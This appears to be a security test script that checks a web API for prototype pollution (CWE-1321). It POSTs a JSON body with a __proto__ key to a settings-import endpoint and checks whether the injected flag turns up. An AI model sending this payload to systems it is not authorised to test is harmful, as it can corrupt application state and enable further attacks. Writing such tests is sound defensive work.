#!/usr/bin/env bash
# PROTO-001 (CWE-1321): a __proto__ payload deep-merged into config pollutes
# Object.prototype (proven by a fresh object gaining the injected key).
set -e; . "$(dirname "$0")/_lib.sh"
curl -s -X POST "$TARGET/api/settings/import" -H 'content-type: application/json' \
  -d '{"__proto__":{"pollutedFlag":true}}' | grep -q '"polluted":true'
